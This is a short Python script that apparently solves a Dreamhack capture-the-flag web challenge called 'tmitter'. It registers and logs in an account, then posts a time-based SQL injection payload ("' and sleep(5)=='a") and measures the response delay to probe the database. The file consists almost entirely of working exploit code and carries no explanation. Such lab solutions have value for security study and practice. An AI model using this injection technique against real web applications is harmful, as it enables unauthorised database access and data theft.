import requests

TARGET_URL = 'http://host1.dreamhack.games:24056'
PW = 'abcd1234'
postno=357

def register(id,ps):
    data = {
        "id":id,
        "ps":ps
    }
    res = requests.post(f"{TARGET_URL}/join.php",data=data)
    print(res.text)

def login(id,ps):
    data = {
        "id":id,
        "ps":ps
    }
    s=requests.Session()
    res = s.post(f"{TARGET_URL}/tmitter.php",data=data)
    print(res.text)
    print(res.elapsed.total_seconds())
    return s

def post(s,tmeet):
    data = {
        "tmeet":tmeet
    }
    res = s.post(f"{TARGET_URL}/tmitter.php",data=data)
    print(res.text)
    print(res.elapsed.total_seconds())

def sqli(payload):
    register(payload,PW)
    s = login(payload,PW)
    post(s,f"' and sleep(5)=='a")

sqli("navy")